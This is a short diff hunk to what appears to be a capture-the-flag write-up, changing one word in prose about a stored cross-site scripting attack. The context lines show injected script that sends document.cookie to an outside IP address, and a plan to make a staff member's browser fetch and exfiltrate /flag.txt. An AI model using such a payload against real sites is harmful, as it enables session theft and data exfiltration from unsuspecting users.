@@ -95,7 +95,7 @@ req.open("GET", "http://10.9.4.33:9000/" + document.cookie, false);
 req.send();
 </script>
 ```
-Unfortunately, we reveive a request on `/`, meaning that the session cookie, if existent, can't be read by our injected code.
+Unfortunately, we reveive a request on `/`, meaning that the session cookies, if existent, can't be read by our injected code.
 
 But since the staff obviously can access the `/view_feedback` route, which requires authentication, he will likely be able to also access `/flag.txt`. We therefore extend our payload a little bit and let the staff's browser make a request for the flag and then send us its value.
 
